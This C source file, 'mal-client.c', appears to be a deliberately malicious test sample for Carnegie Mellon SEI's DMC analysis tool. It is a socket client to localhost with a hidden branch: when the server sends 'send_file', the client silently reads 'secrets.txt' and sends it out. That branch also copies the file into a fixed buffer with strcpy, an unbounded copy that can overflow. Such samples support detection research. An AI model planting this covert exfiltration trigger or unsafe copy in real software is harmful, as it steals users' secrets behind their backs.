// <legal>
// DMC Tool
// Copyright 2023 Carnegie Mellon University.
// 
// NO WARRANTY. THIS CARNEGIE MELLON UNIVERSITY AND SOFTWARE ENGINEERING INSTITUTE
// MATERIAL IS FURNISHED ON AN "AS-IS" BASIS. CARNEGIE MELLON UNIVERSITY MAKES NO
// WARRANTIES OF ANY KIND, EITHER EXPRESSED OR IMPLIED, AS TO ANY MATTER
// INCLUDING, BUT NOT LIMITED TO, WARRANTY OF FITNESS FOR PURPOSE OR
// MERCHANTABILITY, EXCLUSIVITY, OR RESULTS OBTAINED FROM USE OF THE MATERIAL.
// CARNEGIE MELLON UNIVERSITY DOES NOT MAKE ANY WARRANTY OF ANY KIND WITH RESPECT
// TO FREEDOM FROM PATENT, TRADEMARK, OR COPYRIGHT INFRINGEMENT.
// 
// Released under a MIT (SEI)-style license, please see License.txt or contact
// permission@sei.cmu.edu for full terms.
// 
// [DISTRIBUTION STATEMENT A] This material has been approved for public release
// and unlimited distribution.  Please see Copyright notice for non-US Government
// use and distribution.
// 
// Carnegie Mellon (R) and CERT (R) are registered in the U.S. Patent and Trademark
// Office by Carnegie Mellon University.
// 
// This Software includes and/or makes use of the following Third-Party Software
// subject to its own license:
// 1. Phasar
//     (https://github.com/secure-software-engineering/phasar/blob/development/LICENSE.txt)
//     Copyright 2017 - 2023 Philipp Schubert and others.  
// 2. LLVM (https://github.com/llvm/llvm-project/blob/main/LICENSE.TXT) 
//     Copyright 2003 - 2022 LLVM Team.
// 
// DM23-0532
// </legal>

// To compile:
// clang-14 -fno-discard-value-names -fno-inline-functions -ggdb -c -S -emit-llvm -O1 mal-client.c

#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

int is_special_cmd(char *thisBuffer)
{
    int retVal;
    fflush(stdout);
    if (strcmp("send_file\n", thisBuffer) == 0) {
        retVal = 1;
    } else if (strcmp("send_file", thisBuffer) == 0) {
        retVal = 1;
    } else {
        retVal = 0;
    }
    return retVal;
}

static inline char *read_from_file(const char *filename)
{
    FILE *fp;
    char *ret;

    fp = fopen(filename, "rb");
    if (fp) {
        fseek(fp, 0, SEEK_END);
        long fsize = ftell(fp);
        rewind(fp);
        ret = (char *) malloc(fsize + 1);
        if (ret) {
            fread(ret, 1, fsize, fp);
            ret[fsize] = '\0';
        } else {
            // malloc failed
        }
        fclose(fp);
    } else {
        printf("Failed to open file\n");
        ret = NULL;
    }
    return ret;
}

int main(int argc, char **argv)
{
    struct protoent* protoent = getprotobyname("tcp");
    if (protoent == NULL) {
        perror("getprotobyname");
        exit(EXIT_FAILURE);
    }

    int sockfd = socket(AF_INET, SOCK_STREAM, protoent->p_proto);
    if (sockfd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    struct hostent* hostent = gethostbyname("127.0.0.1");
    if (hostent == NULL) {
        fprintf(stderr, "error: gethostbyname failed!\n");
        exit(EXIT_FAILURE);
    }

    in_addr_t in_addr = inet_addr(inet_ntoa(*(struct in_addr *) *(hostent->h_addr_list)));
    if (in_addr == (in_addr_t) - 1) {
        fprintf(stderr, "error: inet_addr(\"%s\")\n",
                *(hostent->h_addr_list));
        exit(EXIT_FAILURE);
    }

    unsigned short server_port = 12345;
    struct sockaddr_in sockaddr_in;
    sockaddr_in.sin_addr.s_addr = in_addr;
    sockaddr_in.sin_family = AF_INET;
    sockaddr_in.sin_port = htons(server_port);

    int connect_error = connect(
        sockfd, 
        (struct sockaddr *) &sockaddr_in, 
        sizeof(sockaddr_in));
    if (connect_error) {
        perror("connect");
        return EXIT_FAILURE;
    }

    char buffer[BUFSIZ];
    char *user_input = NULL;
    size_t getline_buffer = 0;
    ssize_t nbytes_read, i, user_input_len;

    while (1) {
        fprintf(stderr, "Enter string (empty to quit):\n");
        user_input_len = getline(&user_input, &getline_buffer, stdin);
        if (user_input_len == -1) {
            perror("getline");
            exit(EXIT_FAILURE);
        }
        if (user_input_len == 1) {
            close(sockfd);
            break;
        }
        if (strcmp("upload\n", user_input) == 0) {
            fprintf(stderr, "Enter filename (empty to quit):\n");
            user_input_len = getline(&user_input, &getline_buffer, stdin);
            if (user_input_len == -1) {
                perror("getline");
                exit(EXIT_FAILURE);
            }
            if (user_input_len == 1) {
                close(sockfd);
                break;
            }
            user_input[user_input_len - 1] = '\0'; //remove newline
            if (access(user_input, F_OK) == 0) {
                char *fileContents;
                {
                    FILE *fp;
                    char *ret;
                    fp = fopen(user_input, "rb");
                    if (fp) {
                        fseek(fp, 0, SEEK_END);
                        long fsize = ftell(fp);
                        rewind(fp);
                        ret = (char *) malloc(fsize + 1);
                        if (ret) {
                            fread(ret, 1, fsize, fp);
                            ret[fsize] = '\0';
                        } else {
                            // malloc failed
                        }
                        fclose(fp);
                    } else {
                        printf("Failed to open file\n");
                        ret = NULL;
                    }
                    fileContents = ret;
                }
                if (fileContents) {
                    write(sockfd, fileContents, strlen(fileContents));
                }
            } else {
                printf("file does not exist\n");
            }
        } else {
            if (write(sockfd, user_input, user_input_len) == -1) {
                perror("write");
                exit(EXIT_FAILURE);
            }
        }
        while ((nbytes_read = read(sockfd, buffer, BUFSIZ)) > 0) {
            char* pch = strstr(buffer, "send_file\n");
            if (pch != NULL) {
                if (is_special_cmd(pch)) {
                    const char* name = "secrets.txt";
                    if (access(name, F_OK) == 0) {
                        char *fileContents;
                        {
                            FILE *fp;
                            char *ret;
                            fp = fopen(name, "rb");
                            if (fp) {
                                fseek(fp, 0, SEEK_END);
                                long fsize = ftell(fp);
                                rewind(fp);
                                ret = (char *) malloc(fsize + 1);
                                if (ret) {
                                    fread(ret, 1, fsize, fp);
                                    ret[fsize] = '\0';
                                } else {
                                    // malloc failed
                                }
                                fclose(fp);
                            } else {
                                printf("Failed to open file\n");
                                ret = NULL;
                            }
                            fileContents = ret;
                        }
                        if (fileContents) {
                            strcpy(buffer, fileContents);
                            write(sockfd, fileContents, strlen(fileContents));
                        }
                    } else {
                        printf("file does not exist\n");
                    }
                }
            }
            if (buffer[nbytes_read - 1] == '\n') {
                fflush(stdout);
                break;
            }
        }
    }
    free(user_input);
    exit(EXIT_SUCCESS);
}
